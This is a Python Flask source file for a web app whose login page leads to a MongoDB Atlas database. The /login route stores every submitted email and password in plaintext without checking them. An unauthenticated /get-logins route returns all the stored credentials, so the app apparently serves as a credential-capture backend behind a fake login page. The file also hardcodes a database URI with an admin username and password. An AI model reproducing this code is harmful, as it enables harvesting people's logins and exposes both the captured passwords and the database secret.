import os
from urllib.parse import quote_plus
from dotenv import load_dotenv
from flask import Flask, jsonify, request
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from flask import render_template




# Load environment variables from .env file
load_dotenv()

MONGO_USER = os.getenv("MONGO_USER")
MONGO_PASS = os.getenv("MONGO_PASS")
MONGO_HOST = os.getenv("MONGO_HOST")
MONGO_DBNAME = os.getenv("MONGO_DBNAME", "testdb")

# URL-encode password to handle special characters
encoded_pass = quote_plus(MONGO_PASS)

# Build the MongoDB Atlas URI
MONGO_URI = f"mongodb+srv://admin:a24@cluster0.qmeawqo.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

app = Flask(__name__)

# Connect to MongoDB
client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=5000)

# Check connection
try:
    client.server_info()
    print("Connected to MongoDB Atlas ✅")
except ServerSelectionTimeoutError as e:
    print("Could not connect to MongoDB Atlas:", e)

@app.route("/login.html")
def login_page():
    return render_template("login.html")

@app.route("/logins-page")
def logins_page():
    return render_template("logins.html")

@app.route("/register.html")
def register_page():
    return render_template("register.html")


@app.route("/")
def home():
    return render_template("index.html")


# New login route to store email & password
@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or "email" not in data or "password" not in data:
        return jsonify({"error": "Email and password required"}), 400
    print(data)
    # Save login data to 'logins' collection in 'data' DB
    db_data = client["data"]  # explicitly select 'data' DB
    logins_coll = db_data["logins"]
    logins_coll.insert_one({
        "email": data["email"],
        "password": data["password"]
    })

    return jsonify({"message": "Login saved successfully"}), 201
@app.route("/get-logins", methods=["GET"])
def get_logins():
    db_data = client["data"]  # select 'data' DB
    logins_coll = db_data["logins"]

    # Fetch all login documents (excluding MongoDB's `_id`)
    logins = list(logins_coll.find({}, {"_id": 0}))
    return jsonify(logins)


if __name__ == "__main__":
    app.run(debug=False, threaded=False)
